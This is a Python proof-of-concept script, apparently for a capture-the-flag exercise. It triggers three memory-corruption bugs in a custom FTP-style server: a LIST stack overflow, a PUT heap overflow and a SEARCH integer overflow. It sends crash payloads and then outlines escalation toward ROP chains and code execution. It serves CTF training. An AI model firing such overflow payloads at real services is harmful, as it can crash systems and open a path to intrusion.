#!/usr/bin/env python3
"""
Exploitation script for CTF FTP Server vulnerabilities
Demonstrates the three memory corruption bugs for CTF participants
"""

import socket
import struct
import sys
import time

class FTPExploit:
    def __init__(self, host='localhost', port=2121):
        self.host = host
        self.port = port
        self.socket = None
    
    def connect(self):
        """Connect to the FTP server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from the server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
    
    def send_packet(self, cmd_type, data=b''):
        """Send a packet to the server"""
        try:
            magic = 0x46545021  # "FTP!"
            length = len(data)
            
            # Pack header: magic(4) + type(1) + length(2)
            header = struct.pack('>IbH', magic, cmd_type, length)
            
            # Send header + data
            self.socket.send(header + data)
            return True
        except Exception as e:
            print(f"[-] Send failed: {e}")
            return False
    
    def recv_packet(self):
        """Receive a packet from the server"""
        try:
            # Receive header (7 bytes)
            header_data = self.socket.recv(7)
            if len(header_data) < 7:
                return None, None
            
            magic, cmd_type, length = struct.unpack('>IbH', header_data)
            
            if magic != 0x46545021:
                return None, None
            
            # Receive payload
            payload = b''
            if length > 0:
                payload = self.socket.recv(length)
            
            return cmd_type, payload
        except Exception as e:
            print(f"[-] Receive failed: {e}")
            return None, None
    
    def authenticate_anonymous(self):
        """Login as anonymous user"""
        print("[*] Authenticating as anonymous user...")
        
        if not self.send_packet(0x02):  # CMD_ANONYMOUS
            return False
        
        resp_type, payload = self.recv_packet()
        if resp_type == 0x9F and payload:
            status = payload[0]
            if status == 0x00:
                print("[+] Anonymous authentication successful")
                return True
            else:
                print("[-] Anonymous authentication failed")
                return False
        
        return False
    
    def exploit_list_overflow(self):
        """
        EASY: Buffer overflow in LIST command
        
        Vulnerability: Fixed-size buffer (256 bytes) for path processing
        Impact: Stack-based buffer overflow
        Exploitation: Send long directory path to overflow buffer
        """
        print("\n" + "="*60)
        print("EXPLOIT 1: LIST Command Buffer Overflow (EASY)")
        print("="*60)
        
        if not self.connect():
            return False
        
        if not self.authenticate_anonymous():
            self.disconnect()
            return False
        
        print("[*] Crafting buffer overflow payload...")
        
        # Create payload to overflow the 256-byte buffer
        # Pattern to help identify offset in real exploitation
        pattern = b"AAAA" * 100  # 400 bytes to definitely overflow
        
        # Pack LIST command with long path
        data = struct.pack('>H', len(pattern)) + pattern
        
        print(f"[*] Sending LIST command with {len(pattern)} byte path...")
        
        if not self.send_packet(0x12, data):  # CMD_LIST
            self.disconnect()
            return False
        
        try:
            resp_type, payload = self.recv_packet()
            if resp_type:
                print("[!] Server responded - overflow may not have crashed server")
                print(f"[*] Response type: 0x{resp_type:02x}")
            else:
                print("[+] No response - server likely crashed due to overflow!")
        except:
            print("[+] Connection lost - buffer overflow successful!")
        
        self.disconnect()
        return True
    
    def exploit_put_heap_overflow(self):
        """
        MEDIUM: Heap overflow in PUT command
        
        Vulnerability: Server allocates buffer based on declared size
                      but doesn't validate actual data length
        Impact: Heap-based buffer overflow
        Exploitation: Declare small size, send large data
        """
        print("\n" + "="*60)
        print("EXPLOIT 2: PUT Command Heap Overflow (MEDIUM)")
        print("="*60)
        
        if not self.connect():
            return False
        
        if not self.authenticate_anonymous():
            self.disconnect()
            return False
        
        print("[*] Crafting heap overflow payload...")
        
        filename = "exploit.txt"
        filename_bytes = filename.encode('utf-8')
        
        # Declare a small file size but send much more data
        declared_size = 10  # Server allocates 10 bytes
        actual_data = b"B" * 1024  # Send 1024 bytes - heap overflow!
        
        # Pack PUT command
        data = struct.pack('>H', len(filename_bytes)) + filename_bytes + \
               struct.pack('>I', declared_size) + actual_data
        
        print(f"[*] Declared size: {declared_size} bytes")
        print(f"[*] Actual data size: {len(actual_data)} bytes")
        print(f"[*] Overflow: {len(actual_data) - declared_size} bytes")
        
        if not self.send_packet(0x11, data):  # CMD_PUT
            self.disconnect()
            return False
        
        try:
            resp_type, payload = self.recv_packet()
            if resp_type:
                print("[!] Server responded - heap overflow may not have crashed server")
            else:
                print("[+] No response - server likely crashed due to heap overflow!")
        except:
            print("[+] Connection lost - heap overflow successful!")
        
        self.disconnect()
        return True
    
    def exploit_search_integer_overflow(self):
        """
        HARD: Integer overflow in SEARCH command
        
        Vulnerability: Integer overflow in buffer size calculation
                      pattern_len + 1 wraps around when pattern_len = 0xFFFFFFFF
        Impact: Massive heap corruption
        Exploitation: Send pattern_len = 0xFFFFFFFF, causes tiny allocation
                     but large memcpy
        """
        print("\n" + "="*60)
        print("EXPLOIT 3: SEARCH Command Integer Overflow (HARD)")
        print("="*60)
        
        if not self.connect():
            return False
        
        if not self.authenticate_anonymous():
            self.disconnect()
            return False
        
        print("[*] Crafting integer overflow payload...")
        
        # The vulnerability: pattern_len + 1 wraps to 0 when pattern_len = 0xFFFFFFFF
        pattern_len = 0xFFFFFFFF  # Maximum 32-bit unsigned integer
        max_results = 10
        
        # Send actual pattern data (will cause massive overflow)
        pattern = b"C" * 512  # This will overflow the tiny allocated buffer
        
        # Pack SEARCH command
        data = struct.pack('>II', pattern_len, max_results) + pattern
        
        print(f"[*] Pattern length (declared): 0x{pattern_len:08x} ({pattern_len})")
        print(f"[*] Buffer size after overflow: {(pattern_len + 1) & 0xFFFFFFFF}")
        print(f"[*] Actual pattern size: {len(pattern)} bytes")
        print("[*] This will cause massive heap corruption!")
        
        if not self.send_packet(0x17, data):  # CMD_SEARCH
            self.disconnect()
            return False
        
        try:
            resp_type, payload = self.recv_packet()
            if resp_type:
                print("[!] Server responded - integer overflow may not have crashed server")
            else:
                print("[+] No response - server likely crashed due to integer overflow!")
        except:
            print("[+] Connection lost - integer overflow successful!")
        
        self.disconnect()
        return True
    
    def test_normal_functionality(self):
        """Test that normal functionality works before exploitation"""
        print("\n" + "="*60)
        print("TESTING NORMAL FUNCTIONALITY")
        print("="*60)
        
        if not self.connect():
            return False
        
        if not self.authenticate_anonymous():
            self.disconnect()
            return False
        
        print("[*] Testing normal LIST command...")
        
        # Send normal LIST command
        path = ""
        path_bytes = path.encode('utf-8')
        data = struct.pack('>H', len(path_bytes)) + path_bytes
        
        if not self.send_packet(0x12, data):
            self.disconnect()
            return False
        
        resp_type, payload = self.recv_packet()
        if resp_type == 0x91:  # RESP_FILE_LIST
            entry_count = struct.unpack('>H', payload[0:2])[0]
            print(f"[+] Normal LIST works - found {entry_count} entries")
        else:
            print("[-] Normal LIST failed")
        
        self.disconnect()
        return True


def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "localhost"
    
    print("ðŸŽ¯ CTF FTP Server Exploitation Tool")
    print(f"Target: {target}:2121")
    print("\nThis script demonstrates the three memory corruption vulnerabilities:")
    print("1. EASY: Buffer overflow in LIST command")
    print("2. MEDIUM: Heap overflow in PUT command") 
    print("3. HARD: Integer overflow in SEARCH command")
    
    exploit = FTPExploit(target, 2121)
    
    # Test normal functionality first
    if not exploit.test_normal_functionality():
        print("[-] Normal functionality test failed")
        return
    
    print("\nðŸš€ Starting exploitation...")
    
    # Run all exploits
    time.sleep(1)
    exploit.exploit_list_overflow()
    
    time.sleep(2)  # Give server time to restart if it crashed
    exploit.exploit_put_heap_overflow()
    
    time.sleep(2)
    exploit.exploit_search_integer_overflow()
    
    print("\n" + "="*60)
    print("EXPLOITATION COMPLETE")
    print("="*60)
    print("All three vulnerabilities have been demonstrated.")
    print("In a real CTF, you would:")
    print("1. Analyze crash dumps to find exact offsets")
    print("2. Craft ROP chains or shellcode")
    print("3. Bypass ASLR/stack protections")
    print("4. Achieve code execution")
    print("\nFor educational purposes only! ðŸŽ“")


if __name__ == "__main__":
    main()
